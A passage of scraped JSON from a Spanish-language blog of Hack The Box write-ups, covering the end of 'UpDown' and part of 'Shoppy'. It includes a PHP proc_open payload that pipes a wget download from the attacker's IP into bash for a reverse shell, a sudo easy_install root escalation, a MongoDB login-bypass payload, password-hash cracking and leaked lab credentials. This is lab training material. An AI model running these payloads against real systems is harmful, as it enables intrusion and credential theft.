10.10.14.207\u0026#39;, $descriptorspec, $pipes); if (is_resource($process)) { fclose($pipes[0]); echo stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($process); } 1 2 3 4 5 6 7 8 9 10 11 π ~/htb/updown ❯ sudo tcpdump -i tun1 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun1, link-type RAW (Raw IP), snapshot length 262144 bytes 23:45:47.098671 IP siteisup.htb \u0026gt; 10.10.14.207: ICMP echo request, id 2, seq 1, length 64 23:45:47.098694 IP 10.10.14.207 \u0026gt; siteisup.htb: ICMP echo reply, id 2, seq 1, length 64 23:45:48.101063 IP siteisup.htb \u0026gt; 10.10.14.207: ICMP echo request, id 2, seq 2, length 64 23:45:48.101082 IP 10.10.14.207 \u0026gt; siteisup.htb: ICMP echo reply, id 2, seq 2, length 64 23:45:49.103075 IP siteisup.htb \u0026gt; 10.10.14.207: ICMP echo request, id 2, seq 3, length 64 23:45:49.103095 IP 10.10.14.207 \u0026gt; siteisup.htb: ICMP echo reply, id 2, seq 3, length 64 23:45:50.103979 IP siteisup.htb \u0026gt; 10.10.14.207: ICMP echo request, id 2, seq 4, length 64 23:45:50.104009 IP 10.10.14.207 \u0026gt; siteisup.htb: ICMP echo reply, id 2, seq 4, length 64 Utilizamos shells para ejecutar una shell inversa utilizando wget.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), 2 =\u0026gt; array(\u0026#34;file\u0026#34;, \u0026#34;error.txt\u0026#34;, \u0026#34;a\u0026#34;) ); $process = proc_open(\u0026#39;wget -qO- 10.10.14.207:9090/10.10.14.207:1335|bash\u0026#39;, $descriptorspec, $pipes); if (is_resource($process)) { fclose($pipes[0]); echo stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($process); } Con ello logramos obtener acceso como www-data.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 π ~/htb/updown ❯ rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.207] from siteisup.htb [10.10.11.177] 37696 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ which python sh: 0: getcwd() failed: No such file or directory /usr/bin/python $ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory www-data@updown:/var/www/dev/uploads/c1d2f9410ea974ddc7b0b250e752abc2$ whoami;pwd;id www-data pwd: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@updown:/var/www/dev/uploads/c1d2f9410ea974ddc7b0b250e752abc2$ User - Developer Enumerando los directorios, encontramos que el usuario www-data tiene acceso a un archivo python y un ejecutable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 www-data@updown:/home/developer/dev$ ls -lah total 68K drwxr-x--- 2 developer www-data 4.0K Sep 13 22:36 . drwxr-xr-x 6 developer developer 4.0K Aug 30 11:24 .. -rwsr-x--- 1 developer www-data 17K Jun 22 15:45 siteisup -rwxr-x--- 1 developer www-data 154 Jun 22 15:45 siteisup_test.py www-data@updown:/home/developer/dev$ cat siteisup_test.py import requests url = input(\u0026#34;Enter URL here:\u0026#34;) page = requests.get(url) if page.status_code == 200: print \u0026#34;Website is up\u0026#34; else: print \u0026#34;Website is down\u0026#34; www-data@updown:/home/developer/dev$ file siteisup siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped www-data@updown:/home/developer/dev$ siteisup parece ejecutar el archivo de python.\n1 2 3 4 5 6 7 8 9 10 11 12 13 www-data@updown:/home/developer/dev$ ./siteisup Welcome to \u0026#39;siteisup.htb\u0026#39; application http://localhost http://localhost Traceback (most recent call last): File \u0026#34;/home/developer/dev/siteisup_test.py\u0026#34;, line 3, in \u0026lt;module\u0026gt; url = input(\u0026#34;Enter URL here:\u0026#34;) File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1 http://localhost ^ SyntaxError: invalid syntax www-data@updown:/home/developer/dev$ Si observamos las strings vemos que unicamente ejecuta el script.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 www-data@updown:/home/developer/dev$ strings siteisup /lib64/ld-linux-x86-64.so.2 libc.so.6 puts setresgid setresuid system getegid geteuid __cxa_finalize __libc_start_main GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable u+UH []A\\A]A^A_ Welcome to \u0026#39;siteisup.htb\u0026#39; application /usr/bin/python /home/developer/dev/siteisup_test.py :*3$\u0026#34; GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0 [.. snip ..] .comment www-data@updown:/home/developer/dev$ La version de python que utiliza es la 2.7, por lo que la funcion input() es vulnerable.\n1 2 3 www-data@updown:/home/developer/dev$ python --version Python 2.7.18 www-data@updown:/home/developer/dev$ Observamos que es posible ejecutar comandos como developer.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 www-data@updown:/home/developer/dev$ ./siteisup Welcome to \u0026#39;siteisup.htb\u0026#39; application __import__(\u0026#34;os\u0026#34;).system(\u0026#34;id\u0026#34;) __import__(\u0026#34;os\u0026#34;).system(\u0026#34;id\u0026#34;) uid=1002(developer) gid=33(www-data) groups=33(www-data) Traceback (most recent call last): File \u0026#34;/home/developer/dev/siteisup_test.py\u0026#34;, line 4, in \u0026lt;module\u0026gt; page = requests.get(url) File \u0026#34;/usr/local/lib/python2.7/dist-packages/requests/api.py\u0026#34;, line 75, in get return request(\u0026#39;get\u0026#39;, url, params=params, **kwargs) File \u0026#34;/usr/local/lib/python2.7/dist-packages/requests/api.py\u0026#34;, line 61, in request return session.request(method=method, url=url, **kwargs) File \u0026#34;/usr/local/lib/python2.7/dist-packages/requests/sessions.py\u0026#34;, line 515, in request prep = self.prepare_request(req) File \u0026#34;/usr/local/lib/python2.7/dist-packages/requests/sessions.py\u0026#34;, line 453, in prepare_request hooks=merge_hooks(request.hooks, self.hooks), File \u0026#34;/usr/local/lib/python2.7/dist-packages/requests/models.py\u0026#34;, line 318, in prepare self.prepare_url(url, params) File \u0026#34;/usr/local/lib/python2.7/dist-packages/requests/models.py\u0026#34;, line 392, in prepare_url raise MissingSchema(error) requests.exceptions.MissingSchema: Invalid URL \u0026#39;0\u0026#39;: No scheme supplied. Perhaps you meant http://0? www-data@updown:/home/developer/dev$ Shell Realizamos la lectura de la clave privada SSH de developer la cual nos permitio acceder por SSH y obtener la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 π ~/htb/updown ❯ ssh -i id_rsa_developer developer@10.10.11.177 The authenticity of host \u0026#39;10.10.11.177 (10.10.11.177)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:npwXkHj+pLo3LaYR66HNCKEpU/vUoTG03FL41SMlIh0. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.11.177\u0026#39; (ECDSA) to the list of known hosts. Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-122-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Sep 7 22:57:32 UTC 2022 System load: 0.0 Processes: 241 Usage of /: 58.5% of 2.84GB Users logged in: 0 Memory usage: 26% IPv4 address for eth0: 10.10.11.177 Swap usage: 0% * Super-optimized for small spaces - read how we shrank the memory footprint of MicroK8s to make it the smallest full K8s around. https://ubuntu.com/blog/microk8s-memory-optimisation 8 updates can be applied immediately. 8 of these updates are standard security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Wed Sep 7 19:36:02 2022 from 10.10.14.49 developer@updown:~$ whoami;id;pwd developer uid=1002(developer) gid=1002(developer) groups=1002(developer) /home/developer developer@updown:~$ cat user.txt 7fb0f643feb421c8ba6c3a784cb00291 developer@updown:~$ Privesc El usuario developer puede ejecutar easy_install con sudo.\n1 2 3 4 5 6 7 8 9 10 11 12 developer@updown:~$ sudo -l -l Matching Defaults entries for developer on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User developer may run the following commands on localhost: Sudoers entry: RunAsUsers: ALL Options: !authenticate Commands: /usr/local/bin/easy_install developer@updown:~$ Utilizamos la sintaxis recomendada por GTFOBins para ejecutar una shell inversa.\n1 2 3 TF=$(mktemp -d) echo \u0026#34;import os; os.execl(\u0026#39;/bin/sh\u0026#39;, \u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;sh \u0026lt;$(tty) \u0026gt;$(tty) 2\u0026gt;$(tty)\u0026#39;)\u0026#34; \u0026gt; $TF/setup.py sudo easy_install $TF Logrando asi obtener acceso como root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 developer@updown:~$ TF=$(mktemp -d) developer@updown:~$ echo \u0026#34;import os; os.execl(\u0026#39;/bin/sh\u0026#39;, \u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;sh \u0026lt;$(tty) \u0026gt;$(tty) 2\u0026gt;$(tty)\u0026#39;)\u0026#34; \u0026gt; $TF/setup.py developer@updown:~$ sudo easy_install $TF WARNING: The easy_install command is deprecated and will be removed in a future version. Processing tmp.Ms5WAX1pHE Writing /tmp/tmp.Ms5WAX1pHE/setup.cfg Running setup.py -q bdist_egg --dist-dir /tmp/tmp.Ms5WAX1pHE/egg-dist-tmp-Gc6piG # whoami root # cd /root # ls root.txt snap # cat root.txt 2221bcd7b9ead18790e1cc18f3df5754 # ","description":"UpDown expone el repositorio de su sitio web, tras analizar el codigo fuente del sitio identificamos que es posible ejecutar codigo PHP lo cual nos permitió acceder a un primer usuario. La funcion `input()` vulnerable de Python2.7 dentro de un script nos dio acceso a un segundo usuario por SSH. Finalmente escalamos privilegios por medio de easy_install de Python.","id":7,"section":"posts","tags":["php","ffuf","git-dumper","proc_open","python2.7","easy_install"],"title":"Hack The Box - UpDown","uri":"https://sckull.github.io/posts/updown/"},{"content":"\rShoppy expone un sitio web donde explotamos una vulnerabilidad NoSQL Injection la cual nos permitió acceder a información de usuarios, con ello logramos ingresar a Mattermost donde encontramos credenciales que nos dieron acceso por SSH. Accedimos a un segundo usuario con la información obtenida de un fichero ejecutable. Finalmente escalamos privilegios utilizando el comando de docker.\nNombre Shoppy OS Linux Puntos 20 Dificultad Facil IP 10.10.11.180 Maker lockscan\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.7, 4.6, 4.7, 5.3, 5.4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80), 9093 y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 # Nmap 7.92 scan initiated Sun Sep 18 00:13:12 2022 as: nmap -p22,80,9093 -sV -sC -oN nmap_scan 10.129.44.202 Nmap scan report for 10.129.44.202 (10.129.44.202) Host is up (0.068s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA) | 256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA) |_ 256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519) 80/tcp open http nginx 1.23.1 |_http-server-header: nginx/1.23.1 |_http-title: Did not follow redirect to http://shoppy.htb 9093/tcp open copycat? | fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/plain; version=0.0.4; charset=utf-8 | Date: Sun, 18 Sep 2022 00:13:36 GMT | HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime. | TYPE go_gc_cycles_automatic_gc_cycles_total counter | go_gc_cycles_automatic_gc_cycles_total 134 | HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application. | TYPE go_gc_cycles_forced_gc_cycles_total counter | go_gc_cycles_forced_gc_cycles_total 0 | HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles. | TYPE go_gc_cycles_total_gc_cycles_total counter | go_gc_cycles_total_gc_cycles_total 134 | HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles. | TYPE go_gc_duration_seconds summary | go_gc_duration_seconds{quantile=\u0026#34;0\u0026#34;} 4.7598e-05 | go_gc_duration_seconds{quantile=\u0026#34;0.25\u0026#34;} 0.000132256 | go_g | HTTPOptions: | HTTP/1.0 200 OK | Content-Type: text/plain; version=0.0.4; charset=utf-8 | Date: Sun, 18 Sep 2022 00:13:37 GMT | HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime. | TYPE go_gc_cycles_automatic_gc_cycles_total counter | go_gc_cycles_automatic_gc_cycles_total 134 | HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application. | TYPE go_gc_cycles_forced_gc_cycles_total counter | go_gc_cycles_forced_gc_cycles_total 0 | HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles. | TYPE go_gc_cycles_total_gc_cycles_total counter | go_gc_cycles_total_gc_cycles_total 134 | HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles. | TYPE go_gc_duration_seconds summary | go_gc_duration_seconds{quantile=\u0026#34;0\u0026#34;} 4.7598e-05 | go_gc_duration_seconds{quantile=\u0026#34;0.25\u0026#34;} 0.000132256 |_ go_g [.. snip ..] Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Sep 18 00:14:59 2022 -- 1 IP address (1 host up) scanned in 106.32 seconds Puerto 9093 El puerto 9093 parece aceptar solo solicitudes HTTP.\n1 2 3 4 5 6 7 8 π ~/htb/shoppy ❯ nc 10.129.44.202 9093 HTTP/1.1 400 Bad Request Content-Type: text/plain; charset=utf-8 Connection: close 400 Bad Request π ~/htb/shoppy ❯ Dicho puerto muestra algun tipo de log que cambia por cada visita.\nWeb Site Los headers del sitio web indican una redirección al dominio shoppy.htb el cual agregamos al archivo /etc/passwd.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/shoppy ❯ curl -sI 10.129.44.202 HTTP/1.1 301 Moved Permanently Server: nginx/1.23.1 Date: Sun, 18 Sep 2022 00:18:50 GMT Content-Type: text/html Content-Length: 169 Connection: keep-alive Location: http://shoppy.htb π ~/htb/shoppy ❯ El sitio muestra unicamente un contador.\nDirectory Brute Forcing feroxbuster muestra la dirección /admin y /export.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 π ~/htb/shoppy ❯ feroxbuster -u http://shoppy.htb/ -x php,txt,. --depth 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://shoppy.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php, txt, .] 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 10l 16w 179c http://shoppy.htb/images 302 1l 4w 28c http://shoppy.htb/admin 301 10l 16w 171c http://shoppy.htb/js 301 10l 16w 173c http://shoppy.htb/css 200 26l 62w 1074c http://shoppy.htb/login 301 10l 16w 179c http://shoppy.htb/assets 302 1l 4w 28c http://shoppy.htb/Admin 200 26l 62w 1074c http://shoppy.htb/Login 301 10l 16w 177c http://shoppy.htb/fonts 302 1l 4w 28c http://shoppy.htb/ADMIN 301 10l 16w 181c http://shoppy.htb/exports 200 26l 62w 1074c http://shoppy.htb/LOGIN NoSQL - Auth Bypass Observamos en la direccion /admin un panel de logeo.\n/export muestra un mensaje \u0026ldquo;comun\u0026rdquo; a las rutas de una aplicación escrita en NodeJS.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/shoppy ❯ curl -s http://shoppy.htb/exports/ \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;pre\u0026gt;Cannot GET /exports/\u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; π ~/htb/shoppy ❯ Intentamos con distintos payload de SQLi auth bypass pero no funcionó, el sitio mostraba un codigo de respuesta 504 en la mayoria de estos.\nTras intentar con un payloads de MongoDB (' || 1==1%00) logramos realizar bypass al login e ingresar.\nEn la opción de busqueda de usuarios es posible encontrar información de un usuario conocido, la aplicación muestra un boton que redirige a un archivo json.\nObservamos información del usuario admin en el archivo, sin embargo el hash no se encuentra en worldist o sitios comunes.\n1 2 3 4 5 6 7 8 9 π ~/htb/shoppy ❯ curl -s http://shoppy.htb/exports/export-search.json | jq [ { \u0026#34;_id\u0026#34;: \u0026#34;62db0e93d6d6a999a66ee67a\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;23c6877d9e2b564ef8b32c3a23de27b2\u0026#34; } ] π ~/htb/shoppy ❯ Utilizamos nuevamente el payload para el Bypass en la busqueda de usuarios, observamos en el archivo un nuevo usuario: josh.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 π ~/htb/shoppy ❯ curl -s http://shoppy.htb/exports/export-search.json | jq [ { \u0026#34;_id\u0026#34;: \u0026#34;62db0e93d6d6a999a66ee67a\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;23c6877d9e2b564ef8b32c3a23de27b2\u0026#34; }, { \u0026#34;_id\u0026#34;: \u0026#34;62db0e93d6d6a999a66ee67b\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;josh\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;6ebcea65320589ca4f2f1ce039975995\u0026#34; } ] π ~/htb/shoppy ❯ Password Hash Cracking Tras ejecutar john sobre este hash logramos obtener su valor en texto plano.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/shoppy ❯ john hash --wordlist=$ROCK --format=Raw-MD5 Using default input encoding: UTF-8 Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3]) Warning: no OpenMP support for this hash type, consider --fork=4 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status remembermethisway (?) 1g 0:00:00:00 DONE (2022-09-20 00:47) 1.234g/s 17707Kp/s 17707Kc/s 18710KC/s fuckyooh21..*7¡Vamos! Use the \u0026#34;--show --format=Raw-MD5\u0026#34; options to display all of the cracked passwords reliably Session completed π ~/htb/shoppy ❯ Mattermost - Josh Vhosts La contraseña no funciona en el panel de logeo y en el servicio SSH, por lo que realizamos una enumeración de subdominios con ffuf, descubrimos mattermost.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/shoppy ❯ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H \u0026#34;Host: FUZZ.shoppy.htb\u0026#34; -u http://shoppy.htb -fw 5 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : http://shoppy.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.shoppy.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response words: 5 ________________________________________________ mattermost [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 108ms] :: Progress: [100000/100000] :: Job [1/1] :: 520 req/sec :: Duration: [0:03:57] :: Errors: 0 :: π ~/htb/shoppy ❯ Se observa el login de mattermost en el subdominio.\nTras ingresar con las credenciales encontradas, observamos multiples canales.\ncreds.txt\r1 josh : remembermethisway En uno de los canales descubrimos un mensaje mencionando al usuario josh con credenciales de acceso.\ncreds.txt\r1 2 username: jaeger password: Sh0ppyBest@pp! User - Jaeger Con las credenciales encontradas logramos ingresar por SSH y obtener nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 π ~/htb/shoppy ❯ ssh jaeger@shoppy.htb # Sh0ppyBest@pp! jaeger@shoppy.htb\u0026#39;s password: Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. manpath: can\u0026#39;t set the locale; make sure $LC_* and $LANG are correct jaeger@shoppy:~$ whoami;id;pwd jaeger uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger) /home/jaeger jaeger@shoppy:~$ ls Desktop Documents Downloads Music Pictures Public ShoppyApp Templates Videos shoppy_start.sh user.txt jaeger@shoppy:~$ cat user.txt 218dbafd75fd77546952987c70a4b818 jaeger@shoppy:~$ Observamos el codigo fuente del sitio en ShoppyApp/, en este caso el del login.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 //[.. snip ..] app.post(\u0026#39;/login\u0026#39;, async (req, res) =\u0026gt; { const username = req.body.username; const password = req.body.password; if (username === undefined || password === undefined) { res.status(400).send(\u0026#39;Bad Request\u0026#39;); return; } const passToTest = require(\u0026#39;crypto\u0026#39;).createHash(\u0026#39;md5\u0026#39;).update(password).digest(\u0026#39;hex\u0026#39;); const query = { $where: `this.username === \u0026#39;${username}\u0026#39; \u0026amp;\u0026amp; this.password === \u0026#39;${passToTest}\u0026#39;` }; const result = await User.find(query).maxTimeMS(350); if (result.length === 0) { res.redirect(\u0026#39;/login?error=WrongCredentials\u0026#39;); } else { req.session.username = req.body.username; req.session.save((error) =\u0026gt; { if (error) { res.redirect(\u0026#39;/login?error=WrongCredentials\u0026#39;); } else { res.redirect(\u0026#39;/admin\u0026#39;); } }); } }); index.js\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 const express = require(\u0026#39;express\u0026#39;); const mongoose = require(\u0026#39;mongoose\u0026#39;); const User = require(\u0026#39;./schemas/user\u0026#39;); const Product = require(\u0026#39;./schemas/product\u0026#39;); const session = require(\u0026#39;express-session\u0026#39;); const cookieParser = require(\u0026#39;cookie-parser\u0026#39;); const MongoStore = require(\u0026#39;connect-mongo\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const app = express(); app.use(express.urlencoded({extended: true})); app.use(express.json()); app.use(cookieParser()); const mongoUri = \u0026#39;mongodb://127.0.0.1/shoppy\u0026#39;; app.use(session({ secret: \u0026#39;DJ7aAdnkCZs9DZWx\u0026#39;, store: MongoStore.create({mongoUrl: mongoUri}), resave: false, saveUninitialized: false })); app.disable(\u0026#39;x-powered-by\u0026#39;); app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); mongoose.connect(mongoUri); app.use(express.static(\u0026#39;static\u0026#39;)); app.use(\u0026#39;/exports\u0026#39;, express.static(\u0026#39;exports\u0026#39;)); app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.sendFile(\u0026#39;index.html\u0026#39;, {root: __dirname + \u0026#39;/views\u0026#39;}); }); app.get(\u0026#39;/admin\u0026#39;, async (req, res) =\u0026gt; { if (req.session.username) { const data = await Product.find({}); res.render(\u0026#39;admin.ejs\u0026#39;, {products: data}); } else { res.redirect(\u0026#39;/login\u0026#39;); } }); app.get(\u0026#39;/admin/search-users\u0026#39;, async (req, res) =\u0026gt; { if (req.session.username) { if (Object.keys(req.query).length \u0026gt; 0) { try { const query = { $where: \u0026#34;this.username === \u0026#39;\u0026#34; + req.query.username + \u0026#34;\\\u0026#39;\u0026#34; }; const data = await User.find(query).maxTimeMS(350); if (data.length === 0) { res.render(\u0026#39;search.ejs\u0026#39;, {info: \u0026#39;No results for your search\u0026#39;}); } else { fs.writeFileSync(\u0026#39;./exports/export-search.json\u0026#39;, JSON.stringify(data)); res.render(\u0026#39;search.ejs\u0026#39;, {link: \u0026#39;http://shoppy.htb/exports/export-search.json\u0026#39;}); } } catch (e) { res.status(500).send(\u0026#39;Internal Server Error\u0026#39;); } } else { res.render(\u0026#39;search.ejs\u0026#39;); } } else { res.redirect(\u0026#39;/login\u0026#39;); } }); app.get(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { if (req.query.error === \u0026#39;WrongCredentials\u0026#39;) { res.sendFile(\u0026#39;login-error.html\u0026#39;, {root: __dirname + \u0026#39;/views\u0026#39;}); } else { res.sendFile(\u0026#39;login.html\u0026#39;, {root: __dirname + \u0026#39;/views\u0026#39;}); } }); app.post(\u0026#39;/login\u0026#39;, async (req, res) =\u0026gt; { const username = req.body.username; const password = req.body.password; if (username === undefined || password === undefined) { res.status(400).send(\u0026#39;Bad Request\u0026#39;); return; } const passToTest = require(\u0026#39;crypto\u0026#39;).createHash(\u0026#39;md5\u0026#39;).update(password).digest(\u0026#39;hex\u0026#39;); const query = { $where: `this.username === \u0026#39;${username}\u0026#39; \u0026amp;\u0026amp; this.password === \u0026#39;${passToTest}\u0026#39;` }; const result = await User.find(query).maxTimeMS(350); if (result.length === 0) { res.redirect(\u0026#39;/login?error=WrongCredentials\u0026#39;); } else { req.session.username = req.body.username; req.session.save((error) =\u0026gt; { if (error) { res.redirect(\u0026#39;/login?error=WrongCredentials\u0026#39;); } else { res.redirect(\u0026#39;/admin\u0026#39;); } }); } }); app.listen(3000, \u0026#39;localhost\u0026#39;); User - Deploy Jaeger tiene permisos para ejecutar el fichero password-manager como deploy.\n1 2 3 4 